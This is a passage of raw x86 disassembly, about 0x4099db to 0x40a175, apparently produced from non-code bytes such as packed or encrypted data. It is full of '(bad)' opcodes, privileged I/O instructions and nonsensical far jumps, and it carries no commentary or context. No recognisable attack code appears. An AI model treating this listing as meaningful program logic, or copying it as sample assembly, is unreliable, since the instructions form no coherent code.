  4099db:	jb     0x409985
  4099dd:	nop
  4099de:	aam    0x18
  4099e0:	cmp    edi,DWORD PTR [edx-0x4e7a6b99]
  4099e6:	or     cl,BYTE PTR [ecx]
  4099e8:	sbb    al,0x6b
  4099ea:	jbe    0x4099df
  4099ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4099ed:	pop    ss
  4099ee:	mov    gs,WORD PTR [ecx]
  4099f0:	push   esp
  4099f1:	xchg   ebp,eax
  4099f2:	clc    
  4099f3:	add    BYTE PTR [ecx+0x23],dl
  4099f6:	mov    esi,0x3f6adca8
  4099fb:	sbb    edi,eax
  4099fd:	adc    al,dh
  4099ff:	inc    ecx
  409a00:	fdivr  QWORD PTR [edx]
  409a02:	mov    al,0xa
  409a04:	xchg   esi,eax
  409a05:	sub    eax,0xfb592c35
  409a0a:	(bad)  
  409a0c:	scas   eax,DWORD PTR es:[edi]
  409a0d:	or     al,0xf4
  409a0f:	lock ss repnz add eax,0x3795337a
  409a17:	jbe    0x409a93
  409a19:	xlat   BYTE PTR ds:[ebx]
  409a1a:	retf   0xae48
  409a1d:	mov    ebp,0xfa860ccd
  409a22:	ficom  DWORD PTR [ebx+ebx*4+0x74]
  409a26:	mov    BYTE PTR [esp+esi*8+0x3d727d9c],ch
  409a2d:	xor    eax,0xddcd6dd5
  409a32:	push   ebx
  409a33:	mov    DWORD PTR [esi*4-0x543e7f77],esp
  409a3a:	dec    esi
  409a3b:	inc    esp
  409a3c:	lods   eax,DWORD PTR ds:[esi]
  409a3d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409a3e:	and    al,al
  409a40:	xchg   ecx,eax
  409a41:	in     al,dx
  409a42:	jmp    0x409a7d
  409a44:	test   eax,0xe2c0aafe
  409a49:	(bad)  
  409a4a:	int    0x72
  409a4c:	gs push ebp
  409a4e:	sbb    BYTE PTR ds:0x50fc9523,ch
  409a54:	inc    edi
  409a55:	fsubrp st(2),st
  409a57:	fwait
  409a58:	rcr    DWORD PTR [esi+esi*2+0x20],1
  409a5c:	ins    BYTE PTR es:[edi],dx
  409a5d:	ret    0x8fb2
  409a60:	pop    ebp
  409a61:	(bad)  [ebx-0x274c4eba]
  409a67:	test   cl,0x87
  409a6a:	mov    al,0x4e
  409a6c:	call   0x4f13:0xc307d22d
  409a73:	shl    DWORD PTR ds:[ebp+0x771f237a],0x80
  409a7b:	xor    ch,0xa
  409a7e:	pop    esp
  409a7f:	cs xchg esi,eax
  409a81:	leave  
  409a82:	lea    ecx,[ecx+edi*8-0x5662dc92]
  409a89:	mov    eax,0x53d8df72
  409a8e:	cmp    eax,0x84c0ad9b
  409a93:	pop    es
  409a94:	xor    eax,0xf2375ad3
  409a99:	retf   0x558b
  409a9c:	shl    BYTE PTR [edx+0x1d],cl
  409a9f:	adc    edi,ecx
  409aa1:	icebp  
  409aa2:	leave  
  409aa3:	pop    esp
  409aa4:	test   al,0xe9
  409aa6:	jle    0x409a73
  409aa8:	ja     0x409ac0
  409aaa:	out    dx,al
  409aab:	shr    DWORD PTR [eax-0x1c],1
  409aae:	out    dx,eax
  409aaf:	pusha  
  409ab0:	outs   dx,DWORD PTR ds:[esi]
  409ab1:	adc    al,0x35
  409ab3:	popa   
  409ab4:	xchg   ebp,eax
  409ab5:	sbb    DWORD PTR [ecx+ebx*2-0x4f],eax
  409ab9:	paddusw mm7,mm4
  409abc:	inc    eax
  409abd:	(bad)  
  409abe:	out    0x55,al
  409ac0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409ac1:	push   esp
  409ac2:	or     eax,0x4f8ff9c
  409ac7:	or     ah,0xbe
  409aca:	mov    al,ds:0xaee0700f
  409acf:	lds    edi,FWORD PTR [edx-0x41fd71b3]
  409ad5:	push   eax
  409ad6:	mov    ah,bh
  409ad8:	cmp    al,0xde
  409ada:	mov    ebp,0xca75d05c
  409adf:	push   cs
  409ae0:	mov    dl,0xe0
  409ae2:	repnz aad 0xc1
  409ae5:	icebp  
  409ae6:	stc    
  409ae7:	push   0x1b
  409ae9:	mov    ds:0x65bd4b75,al
  409aee:	es pop ss
  409af0:	into   
  409af1:	and    BYTE PTR [ebp+eax*4+0x2c],0xa9
  409af6:	ins    BYTE PTR es:[edi],dx
  409af7:	jmp    0xafbf:0xc2af8917
  409afe:	loop   0x409b65
  409b00:	inc    edx
  409b01:	daa    
  409b02:	cdq    
  409b03:	aad    0xe3
  409b05:	js     0x409b3e
  409b07:	or     cl,BYTE PTR [eax+0x3de941b3]
  409b0d:	mov    dl,0xba
  409b0f:	inc    ebx
  409b10:	int3   
  409b11:	loope  0x409afa
  409b13:	push   ecx
  409b14:	mov    edx,0xf44c131a
  409b19:	xor    eax,0xaced6076
  409b1e:	dec    ebx
  409b1f:	mov    bh,0x3f
  409b21:	jl     0x409ab6
  409b23:	into   
  409b24:	jmp    0x409b2e
  409b26:	pop    es
  409b27:	and    BYTE PTR [edx+0xfc3380d],al
  409b2d:	es pop es
  409b2f:	xchg   dx,ax
  409b31:	loopne 0x409adc
  409b33:	mov    ds:0x79ecc06a,eax
  409b38:	mov    ch,0x5a
  409b3a:	aas    
  409b3b:	ror    bh,cl
  409b3d:	adc    eax,0x1b018452
  409b42:	inc    ebp
  409b43:	jmp    0x2456:0x5b53b418
  409b4a:	jmp    DWORD PTR [ebx+0x4e19e1a7]
  409b50:	mov    ds:0x3710ac69,al
  409b55:	mov    WORD PTR [ecx+0x3],gs
  409b58:	adc    BYTE PTR [edx+ebx*2+0x1a61e753],0x4c
  409b60:	icebp  
  409b61:	jmp    0xc206:0xae0626c
  409b68:	cli    
  409b69:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409b6a:	sub    DWORD PTR [eax-0x2bc51f15],edi
  409b70:	in     eax,dx
  409b71:	hlt    
  409b72:	(bad)  
  409b73:	fisubr WORD PTR [ecx]
  409b75:	dec    eax
  409b76:	push   ebx
  409b77:	test   BYTE PTR [edx],0xe5
  409b7a:	ss popa 
  409b7c:	daa    
  409b7d:	and    cl,BYTE PTR [ebx+ecx*8+0x29db3f02]
  409b84:	jno    0x409b83
  409b86:	fisub  DWORD PTR [esi-0xb]
  409b89:	push   ds
  409b8a:	xchg   BYTE PTR [edi],dh
  409b8c:	mov    ecx,0x29aeae00
  409b91:	loop   0x409b2b
  409b93:	mov    ch,BYTE PTR [esi]
  409b95:	inc    ebp
  409b96:	sub    DWORD PTR [ecx-0x2d],esi
  409b99:	imul   edi,DWORD PTR [edi+0x21],0x82f5fb69
  409ba0:	and    BYTE PTR ss:[edx],bl
  409ba3:	int    0x29
  409ba5:	jmp    0x61a4:0xed4c3d7
  409bac:	cld    
  409bad:	cdq    
  409bae:	dec    ebx
  409baf:	mov    al,ds:0x50dabc45
  409bb4:	fnstsw WORD PTR [ecx+0x691b0bff]
  409bba:	jbe    0x409be3
  409bbc:	pop    ecx
  409bbd:	arpl   WORD PTR [esp+eax*8],bp
  409bc0:	cmp    BYTE PTR [ebx-0x78],ah
  409bc3:	and    eax,0x5c4a36f1
  409bc8:	outs   dx,BYTE PTR ds:[esi]
  409bc9:	mov    ah,0xd4
  409bcb:	or     cl,cl
  409bcd:	imul   esi,DWORD PTR [eax-0x3f],0x4d183fb0
  409bd4:	sub    DWORD PTR [edx-0x18],ecx
  409bd7:	mov    BYTE PTR [ebx-0x68e6be64],bh
  409bdd:	sbb    DWORD PTR [eax-0x3c],edi
  409be0:	or     al,0x33
  409be2:	fld    TBYTE PTR [ecx-0x5b]
  409be5:	cmc    
  409be6:	clc    
  409be7:	lock cmp bl,BYTE PTR [edx+0x7e]
  409beb:	imul   edx,DWORD PTR [edi],0x8f8f4610
  409bf1:	das    
  409bf2:	sbb    eax,0xc8d3ba62
  409bf7:	stos   BYTE PTR es:[edi],al
  409bf8:	push   es
  409bf9:	cmp    BYTE PTR [ebx-0x64f03e87],ch
  409bff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409c00:	mov    bl,0xec
  409c02:	fadd   st,st(4)
  409c04:	in     eax,0x13
  409c06:	inc    ecx
  409c07:	data16 mov al,0xc7
  409c0a:	es ret 
  409c0c:	dec    ecx
  409c0d:	sub    BYTE PTR [eax],cl
  409c0f:	loopne 0x409c3f
  409c11:	(bad)
  409c14:	adc    bl,BYTE PTR [ebp-0x3e327319]
  409c1a:	aaa    
  409c1b:	mov    al,0x2e
  409c1d:	call   0x161326ee
  409c22:	(bad)  
  409c23:	retf   
  409c24:	frstor [esp+ebx*4+0x6581f0c5]
  409c2b:	sbb    bh,BYTE PTR [edi+0x59]
  409c2e:	mov    al,0xe0
  409c30:	icebp  
  409c31:	add    eax,0x8d67f984
  409c36:	add    ebx,DWORD PTR [ebx-0x2d]
  409c39:	sti    
  409c3a:	xlat   BYTE PTR ds:[ebx]
  409c3b:	cmp    eax,0xa60d41d
  409c40:	mov    bh,dl
  409c42:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409c43:	adc    DWORD PTR [esi],0x223f2030
  409c49:	adc    eax,0x4f38f6f4
  409c4e:	pop    ecx
  409c4f:	nop
  409c50:	test   cl,bh
  409c52:	arpl   WORD PTR [eax+0x74],di
  409c55:	imul   edx,ebx,0xcc3372f1
  409c5b:	int3   
  409c5c:	in     eax,dx
  409c5d:	fsub   st(3),st
  409c5f:	push   edi
  409c60:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409c61:	adc    eax,0x5037ecff
  409c66:	jmp    0x409c2a
  409c68:	mov    al,0xc4
  409c6a:	pop    ebx
  409c6b:	call   0x74fd536
  409c70:	mov    edx,ebp
  409c72:	lock mov DWORD PTR ds:0x5a27d406,ecx
  409c79:	adc    al,0x21
  409c7b:	das    
  409c7c:	ror    BYTE PTR [edi],1
  409c7e:	stos   BYTE PTR es:[edi],al
  409c7f:	rcr    BYTE PTR [esp+ebx*1-0x107161b9],1
  409c86:	(bad)  
  409c87:	(bad)  
  409c89:	sahf   
  409c8a:	add    esp,DWORD PTR [edi-0x3b]
  409c8d:	or     bh,BYTE PTR [edx+0x7e87be06]
  409c93:	push   0xbc5c0caa
  409c98:	cmp    bh,BYTE PTR [edi]
  409c9a:	into   
  409c9b:	xchg   ecx,eax
  409c9c:	sub    DWORD PTR [ebx+0x4d],0x5b644568
  409ca3:	cld    
  409ca4:	dec    edi
  409ca5:	mov    bh,0xb7
  409ca7:	retf   0x1aca
  409caa:	nop
  409cab:	repnz push edx
  409cad:	xchg   edi,eax
  409cae:	mov    gs,WORD PTR [edx-0x4ce7da33]
  409cb4:	mov    edi,DWORD PTR [eax]
  409cb6:	jmp    0x245a:0x737f3d51
  409cbd:	ins    DWORD PTR es:[edi],dx
  409cbe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409cbf:	push   edx
  409cc0:	push   0x79
  409cc2:	or     edx,DWORD PTR [edx+0x38]
  409cc5:	sub    ebp,DWORD PTR [ebx-0x614948c1]
  409ccb:	adc    DWORD PTR [eax+0x30],esi
  409cce:	inc    esp
  409ccf:	jle    0x409c6b
  409cd1:	repnz ss cmp esp,0x49
  409cd6:	jno    0x409c7d
  409cd8:	xor    al,0x78
  409cda:	das    
  409cdb:	cmc    
  409cdc:	loopne 0x409cda
  409cde:	mov    bh,0x1e
  409ce0:	xchg   ecx,eax
  409ce1:	cli    
  409ce2:	mov    dl,0xe7
  409ce4:	in     eax,dx
  409ce5:	xor    ah,BYTE PTR [ebp-0x16528b44]
  409ceb:	cbw    
  409ced:	push   ds
  409cee:	sbb    eax,0x5a4b649d
  409cf3:	adc    dh,BYTE PTR [eax+0x1a]
  409cf6:	test   al,0x51
  409cf8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409cf9:	std    
  409cfa:	mov    al,0x59
  409cfc:	mov    al,0x9
  409cfe:	inc    ebx
  409cff:	sar    BYTE PTR [edi+0x7958e02f],0xef
  409d06:	inc    ebx
  409d07:	add    edx,DWORD PTR [esi]
  409d09:	lahf   
  409d0a:	or     dl,BYTE PTR [eax-0x3c6d6d05]
  409d10:	xor    BYTE PTR [eax+0x58d2debd],dh
  409d16:	imul   edx,DWORD PTR [ecx-0x33],0x3f140371
  409d1d:	mov    eax,0x4c8877d7
  409d22:	pop    esp
  409d23:	push   esi
  409d24:	push   esp
  409d25:	push   ebp
  409d26:	shl    BYTE PTR [ebx+0x45f327d8],1
  409d2c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409d2d:	pop    edi
  409d2e:	add    DWORD PTR [eax-0x174d7488],ecx
  409d34:	lahf   
  409d35:	int3   
  409d36:	outs   dx,DWORD PTR ds:[esi]
  409d37:	jo     0x409d52
  409d39:	cwde   
  409d3a:	pop    eax
  409d3b:	inc    ebx
  409d3c:	popa   
  409d3d:	dec    edx
  409d3e:	dec    di
  409d40:	ficomp WORD PTR [ecx+0x1e3db629]
  409d46:	pop    ebx
  409d47:	lea    edx,[eax+0x389f1149]
  409d4d:	stos   BYTE PTR es:[edi],al
  409d4e:	sub    BYTE PTR [edi],ch
  409d50:	stos   BYTE PTR es:[edi],al
  409d51:	xchg   esi,eax
  409d52:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409d53:	dec    ecx
  409d54:	dec    ebx
  409d55:	fwait
  409d56:	xor    ebx,DWORD PTR [ebx+edx*2]
  409d59:	stos   BYTE PTR es:[edi],al
  409d5a:	retf   
  409d5b:	mov    DWORD PTR [eax],ebp
  409d5d:	xor    ch,BYTE PTR [edx+0x56c245e]
  409d63:	fnstenv [eax]
  409d65:	push   esi
  409d66:	add    esp,0xffffffd0
  409d69:	mov    ebp,0x9fdb3e32
  409d6e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409d6f:	loope  0x409dc8
  409d71:	xor    bh,BYTE PTR ds:0x4dd0d41e
  409d77:	sub    ebx,DWORD PTR [ebp+0x57]
  409d7a:	mov    bl,0xe5
  409d7c:	stos   BYTE PTR es:[edi],al
  409d7d:	mov    al,0xc6
  409d7f:	jns    0x409d64
  409d81:	imul   eax,DWORD PTR ds:0x2c081331,0x48
  409d88:	or     eax,0x6720855f
  409d8d:	jne    0x409df0
  409d8f:	xchg   esi,eax
  409d90:	xor    eax,esp
  409d92:	dec    edx
  409d93:	xchg   edi,eax
  409d94:	mov    esi,edi
  409d96:	test   BYTE PTR [ebp-0x512a2848],dl
  409d9c:	jmp    edi
  409d9e:	(bad)  
  409d9f:	ds push ebx
  409da1:	dec    edx
  409da2:	(bad)  
  409da4:	mov    edi,0x675d434
  409da9:	aam    0xb
  409dab:	cwde   
  409dac:	in     al,0x56
  409dae:	jbe    0x409d3b
  409db0:	xchg   edx,eax
  409db1:	shl    BYTE PTR [edx+ebp*4-0x14],0xcb
  409db6:	adc    BYTE PTR [edx+0x452d61d5],bh
  409dbc:	ficom  DWORD PTR [ecx-0x2a]
  409dbf:	aam    0x37
  409dc1:	and    DWORD PTR [esi],0x26
  409dc4:	aad    0x5d
  409dc6:	ins    BYTE PTR es:[edi],dx
  409dc7:	call   0x3213:0xa4893889
  409dce:	or     DWORD PTR [edx+0x5e7b5dd2],ebx
  409dd4:	dec    eax
  409dd5:	retf   0x4dc3
  409dd8:	leave  
  409dd9:	cwde   
  409dda:	jno    0x409d99
  409ddc:	xor    DWORD PTR [edx],esp
  409dde:	mov    bh,0xf3
  409de1:	dec    ebx
  409de2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409de3:	mov    bl,0x31
  409de5:	pop    ebx
  409de6:	int    0xd4
  409de8:	jns    0x409dc8
  409dea:	sbb    al,0xc2
  409dec:	out    0x31,al
  409dee:	ins    BYTE PTR es:[edi],dx
  409def:	pop    ebx
  409df0:	std    
  409df1:	sub    edi,ebp
  409df3:	jmp    0x409df5
  409df5:	add    eax,0xf7821e0f
  409dfa:	add    BYTE PTR [edi-0x5f],0x2e
  409dfe:	mov    edx,0x583eab3f
  409e03:	ins    DWORD PTR es:[edi],dx
  409e04:	xchg   ebx,eax
  409e05:	push   edx
  409e06:	test   BYTE PTR [ecx],ch
  409e08:	icebp  
  409e09:	dec    esi
  409e0a:	(bad)  
  409e0b:	fld    QWORD PTR [ecx+edi*1+0x6b]
  409e0f:	test   BYTE PTR [ebp-0x578215d0],ch
  409e15:	push   cs
  409e16:	xor    ebx,ebp
  409e18:	pop    eax
  409e19:	push   DWORD PTR [esi]
  409e1b:	pop    ecx
  409e1c:	aaa    
  409e1d:	add    DWORD PTR [ecx+0x7e47a783],ecx
  409e23:	pushf  
  409e24:	ds scas al,BYTE PTR es:[edi]
  409e26:	inc    eax
  409e27:	push   eax
  409e28:	sbb    bl,BYTE PTR [edx-0x50]
  409e2b:	or     al,0x28
  409e2d:	test   ebp,0xb95a7594
  409e33:	xor    ebx,DWORD PTR [eax-0x31953925]
  409e39:	mov    edi,0xca23f555
  409e3e:	sub    BYTE PTR [esi-0x7f],bl
  409e41:	push   esp
  409e42:	xchg   edx,eax
  409e43:	and    ch,BYTE PTR ds:[ebx-0x359fd673]
  409e4a:	les    esi,FWORD PTR [ebx]
  409e4c:	ss ja  0x409ec4
  409e4f:	dec    eax
  409e50:	sub    eax,DWORD PTR [esi-0x41]
  409e53:	fimul  WORD PTR [edi+edx*1]
  409e56:	fdiv   QWORD PTR [esi+0x5e]
  409e59:	test   al,0x1c
  409e5b:	sub    eax,0xfd29a1b3
  409e60:	mov    bh,0x63
  409e62:	cld    
  409e63:	add    eax,0xb666394d
  409e68:	lds    eax,FWORD PTR [esi+ebp*2]
  409e6b:	sub    DWORD PTR [ebx+0xb8950c4],ebx
  409e71:	out    0xac,al
  409e73:	mov    esi,0xd1ff7859
  409e78:	rol    edi,cl
  409e7a:	fs jge 0x409e2d
  409e7d:	ror    BYTE PTR [esi+0x77e360ac],cl
  409e83:	xchg   ebp,eax
  409e84:	ret    
  409e85:	addr16 jge 0x409e76
  409e88:	mov    ch,0x0
  409e8a:	pop    ss
  409e8b:	lock cs (bad) 
  409e8e:	jb     0x409e85
  409e90:	mov    ch,0x71
  409e92:	mov    esi,DWORD PTR [edi]
  409e94:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409e95:	dec    edx
  409e96:	jne    0x409e76
  409e98:	mov    al,0x50
  409e9a:	int    0x2
  409e9c:	jo     0x409e4b
  409e9e:	cld    
  409e9f:	(bad)  
  409ea1:	mov    es,WORD PTR [esi]
  409ea3:	mov    BYTE PTR [edx-0x7e],0xc5
  409ea7:	adc    ebx,DWORD PTR [esi+0x4883365d]
  409ead:	fcomi  st,st(3)
  409eaf:	pop    edi
  409eb0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409eb1:	(bad)  
  409eb2:	push   0xcd551671
  409eb7:	or     al,0x7e
  409eb9:	add    al,0x3c
  409ebb:	and    al,0xea
  409ebd:	xlat   BYTE PTR ds:[ebx]
  409ebe:	pop    ss
  409ebf:	pop    ecx
  409ec0:	imul   ebp,DWORD PTR [eax+edx*4+0x66],0x2d
  409ec5:	push   eax
  409ec6:	mov    ebx,0x500ac3ff
  409ecb:	cmp    eax,DWORD PTR [esp+edi*1-0x5cb2dfe7]
  409ed2:	mov    ah,0x8d
  409ed4:	stc    
  409ed5:	cli    
  409ed6:	outs   dx,DWORD PTR ds:[esi]
  409ed7:	retf   
  409ed8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409ed9:	(bad)  
  409eda:	hlt    
  409edb:	mov    ch,cl
  409edd:	sub    al,0xcd
  409edf:	cwde   
  409ee0:	rcr    DWORD PTR [esi+0x4a8320fb],1
  409ee6:	mov    es,esp
  409ee8:	arpl   WORD PTR [ebp-0x42339213],si
  409eee:	adc    BYTE PTR [ecx+0x6b],cl
  409ef1:	fbld   TBYTE PTR [eax-0x1f]
  409ef4:	call   DWORD PTR [eax+ecx*1+0x13]
  409ef8:	sub    eax,0x51648a1d
  409efd:	jne    0x409eeb
  409eff:	mov    BYTE PTR [ebx-0x2afa8d1a],bl
  409f05:	je     0x409eee
  409f07:	idiv   BYTE PTR [edx]
  409f09:	in     eax,0x25
  409f0b:	icebp  
  409f0c:	stos   BYTE PTR es:[edi],al
  409f0d:	mov    dl,0x8a
  409f0f:	cmc    
  409f10:	das    
  409f11:	ja     0x409f47
  409f13:	test   DWORD PTR [esp+ecx*8+0x20484f7c],ebx
  409f1a:	mov    ebx,0x8d7ee217
  409f1f:	jne    0x409eb5
  409f21:	and    bh,ah
  409f23:	call   0x4badf414
  409f28:	lahf   
  409f29:	popf   
  409f2a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409f2b:	shl    BYTE PTR gs:[eax-0x7d],1
  409f2f:	push   es
  409f30:	jae    0x409ebc
  409f32:	daa    
  409f33:	pop    ss
  409f34:	pop    ebx
  409f35:	xchg   edi,eax
  409f36:	sub    DWORD PTR [edi-0x3f04f66b],ebp
  409f3c:	add    DWORD PTR [edx+0x1a],edx
  409f3f:	imul   ebp,edi,0x20ac51c6
  409f45:	imul   edi,DWORD PTR [edx-0x5dac07b9],0x57
  409f4c:	imul   eax,DWORD PTR [eax+0x7222bef1],0xfffffff6
  409f53:	es ds pop edi
  409f56:	adc    esp,DWORD PTR [eax-0x17d3dd89]
  409f5c:	jge    0x409fda
  409f5e:	xchg   ebx,eax
  409f5f:	mov    DWORD PTR [eax-0x18],esp
  409f62:	inc    esi
  409f63:	push   ecx
  409f64:	je     0x409f00
  409f66:	clc    
  409f67:	std    
  409f68:	call   0x84d9cf19
  409f6d:	pop    ds
  409f6e:	stos   BYTE PTR es:[edi],al
  409f6f:	jge    0x409f75
  409f71:	repnz mov DWORD PTR [ebx-0x5d0efdc7],edi
  409f78:	xchg   ecx,eax
  409f79:	sti    
  409f7a:	outs   dx,DWORD PTR ds:[esi]
  409f7b:	pop    ss
  409f7c:	xchg   ebp,eax
  409f7d:	ficomp DWORD PTR [edi-0x60de60ba]
  409f83:	jmp    0x59fa:0x2e5b558b
  409f8a:	add    al,0x2b
  409f8c:	mov    ah,0x28
  409f8e:	lds    esp,FWORD PTR [eax]
  409f90:	and    ebp,eax
  409f92:	mov    dl,0xf7
  409f94:	sub    esp,DWORD PTR [ecx]
  409f96:	push   ebp
  409f97:	xchg   edi,eax
  409f98:	xor    DWORD PTR [eax+edx*2-0x364cbc2f],esp
  409f9f:	or     dl,0xa7
  409fa2:	ss or  al,0x75
  409fa5:	fwait
  409fa6:	adc    eax,0xe18c2054
  409fab:	jo     0x409f4b
  409fad:	scas   al,BYTE PTR es:[edi]
  409fae:	jmp    0x40a009
  409fb0:	xor    bh,BYTE PTR [ebx]
  409fb2:	pop    ecx
  409fb3:	data16 rcr BYTE PTR [eax],cl
  409fb6:	fsub   QWORD PTR ds:0x86e597ce
  409fbc:	js     0x409fab
  409fbe:	lods   al,BYTE PTR ds:[esi]
  409fbf:	xor    BYTE PTR [eax-0x25],cl
  409fc2:	scas   al,BYTE PTR es:[edi]
  409fc3:	push   esp
  409fc4:	jbe    0x409fa3
  409fc6:	xor    cl,BYTE PTR [ebx]
  409fc8:	adc    DWORD PTR [ebp+0x69],ebp
  409fcb:	imul   edi,DWORD PTR [ebx+0x54bed9e9],0xffffffb5
  409fd2:	div    dl
  409fd4:	pop    eax
  409fd5:	outs   dx,DWORD PTR ds:[esi]
  409fd6:	js     0x409f5b
  409fd8:	xchg   esi,eax
  409fd9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409fda:	outs   dx,DWORD PTR ds:[esi]
  409fdb:	or     DWORD PTR [esi-0x5525a44b],edi
  409fe1:	pop    edi
  409fe2:	jle    0x409f6f
  409fe4:	bound  ebx,QWORD PTR [edx+0x37]
  409fe7:	loope  0x409fbb
  409fe9:	ret    
  409fea:	call   0x741b:0x589d4662
  409ff1:	popf   
  409ff2:	scas   al,BYTE PTR es:[edi]
  409ff3:	fldenv [eax+0x25cd16b6]
  409ff9:	cmc    
  409ffa:	addr16 std 
  409ffc:	(bad)  
  409ffd:	sti    
  409ffe:	shr    BYTE PTR [esi+edi*1-0x43],0x9
  40a003:	aam    0xda
  40a005:	dec    BYTE PTR [esi-0x3870cc39]
  40a00b:	xor    BYTE PTR [ecx-0x795740ef],bh
  40a011:	xchg   esp,eax
  40a012:	fisttp DWORD PTR [ebx-0x1a]
  40a015:	xchg   ebp,eax
  40a016:	in     eax,dx
  40a017:	enter  0x252c,0x93
  40a01b:	cld    
  40a01c:	(bad)  
  40a01d:	or     ebp,ebp
  40a01f:	fs jg  0x40a0a0
  40a022:	ss push ss
  40a024:	icebp  
  40a025:	sahf   
  40a026:	or     al,0xf
  40a028:	adc    ch,BYTE PTR [edi+0x38d0fa1e]
  40a02e:	enter  0x7dab,0x30
  40a032:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a033:	push   esp
  40a034:	add    eax,0x86adc727
  40a039:	cmc    
  40a03a:	retf   
  40a03b:	mov    ecx,0xa92bf9b0
  40a040:	fisub  DWORD PTR [ebx-0x7549663e]
  40a046:	pop    ebx
  40a047:	adc    cl,0x52
  40a04a:	sbb    edx,DWORD PTR ds:[edi-0xd3b3651]
  40a051:	mov    ds:0x9136dac7,al
  40a056:	(bad)  
  40a057:	pop    ecx
  40a058:	mov    cl,0xb6
  40a05a:	lods   eax,DWORD PTR fs:[esi]
  40a05c:	std    
  40a05d:	mov    ebx,edx
  40a05f:	(bad)  
  40a060:	clc    
  40a061:	cmp    esp,0x839589f2
  40a067:	jb     0x40a03f
  40a069:	add    ebx,esp
  40a06b:	out    0x5f,al
  40a06d:	xchg   ebp,eax
  40a06e:	int    0xcf
  40a070:	rcr    BYTE PTR [eax+ecx*8+0x10e8d617],1
  40a077:	add    esp,DWORD PTR [eax+0xd]
  40a07a:	mov    WORD PTR [edi-0x4f],cs
  40a07d:	(bad)  
  40a07e:	push   esp
  40a07f:	sbb    DWORD PTR [ebx+0x12],ebx
  40a082:	push   eax
  40a083:	jmp    0x40a00e
  40a085:	aam    0x91
  40a087:	inc    esi
  40a088:	pop    ecx
  40a089:	pusha  
  40a08a:	ror    al,0xc6
  40a08d:	lahf   
  40a08e:	cmc    
  40a08f:	mov    al,ds:0x17584646
  40a094:	inc    ecx
  40a095:	sbb    esp,DWORD PTR [ecx+0x3dc0e9fd]
  40a09b:	popa   
  40a09c:	fisttp DWORD PTR ds:[ebx]
  40a09f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a0a0:	mov    ch,0xa7
  40a0a2:	mov    dh,0x55
  40a0a4:	fdiv   QWORD PTR ds:0xc2085f04
  40a0aa:	adc    BYTE PTR [edi+ebx*1-0x200fc951],bl
  40a0b1:	outs   dx,DWORD PTR ds:[esi]
  40a0b2:	sbb    eax,0xeff95bd
  40a0b7:	push   ebp
  40a0b8:	sbb    al,0x8e
  40a0ba:	cli    
  40a0bb:	shl    BYTE PTR [eax],1
  40a0bd:	push   ecx
  40a0be:	xchg   BYTE PTR [ecx],ah
  40a0c0:	jno    0x40a049
  40a0c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a0c3:	xchg   esi,eax
  40a0c4:	xor    BYTE PTR [edx+edi*8-0x5c],cl
  40a0c8:	adc    al,BYTE PTR [esi+0x15]
  40a0cb:	lds    ebp,FWORD PTR [edx-0x2f30c331]
  40a0d1:	mov    DWORD PTR [esi+0x7f],edx
  40a0d4:	leave  
  40a0d5:	sub    esp,DWORD PTR [edx-0x2d68e7b8]
  40a0db:	or     BYTE PTR ds:0xa999c2f8,ah
  40a0e1:	sbb    eax,0x94c99f3d
  40a0e6:	cmp    DWORD PTR [ebx-0x7e],ebx
  40a0e9:	jne    0x40a0ba
  40a0eb:	not    DWORD PTR ds:0x502845f3
  40a0f1:	(bad)  
  40a0f2:	retf   0x5bfe
  40a0f5:	loope  0x40a100
  40a0f7:	xor    DWORD PTR ds:0x4abe489f,edi
  40a0fd:	iret   
  40a0fe:	xor    DWORD PTR [esi+0x35579291],esi
  40a104:	jecxz  0x40a115
  40a106:	jmp    0x40a11f
  40a108:	imul   edi,DWORD PTR [eax-0x1e],0xffffff8b
  40a10c:	stos   BYTE PTR es:[edi],al
  40a10d:	xlat   BYTE PTR ds:[ebx]
  40a10e:	xchg   esi,eax
  40a10f:	outs   dx,BYTE PTR fs:[esi]
  40a111:	popf   
  40a112:	test   eax,0xb116ec38
  40a117:	mov    ebp,0xbc91d317
  40a11c:	mov    eax,0x152c22da
  40a121:	call   0xf841:0xb27777e2
  40a128:	and    BYTE PTR [edx],dh
  40a12a:	jge    0x40a10a
  40a12c:	mov    DWORD PTR [ebx-0x55],edi
  40a12f:	hlt    
  40a130:	inc    ebp
  40a131:	mov    bh,0xad
  40a133:	push   ecx
  40a134:	out    dx,al
  40a135:	popf   
  40a136:	xor    BYTE PTR [edi],0xa4
  40a139:	pop    eax
  40a13a:	enter  0x54ea,0xbd
  40a13e:	mov    eax,ds:0xa31a7dbf
  40a143:	inc    ebx
  40a144:	adc    BYTE PTR [esi],0xfe
  40a147:	inc    ecx
  40a148:	es add al,0x51
  40a14b:	sub    eax,0xe544727d
  40a150:	scas   eax,DWORD PTR es:[edi]
  40a151:	push   ss
  40a152:	(bad)  
  40a153:	icebp  
  40a154:	sub    DWORD PTR [eax-0x41],edi
  40a157:	imul   edx,esi,0xffffffb2
  40a15a:	int3   
  40a15b:	sub    BYTE PTR [ebp+eiz*4-0x19],dh
  40a15f:	call   0xe224:0x58a50d84
  40a166:	and    BYTE PTR [ebx],ch
  40a168:	mov    WORD PTR [eax],cs
  40a16a:	push   esp
  40a16b:	add    al,bh
  40a16d:	jmp    0x40a1e7
  40a16f:	mov    esp,0x9fd18827
  40a174:	sti    
  40a175:	jg     0x40a13d
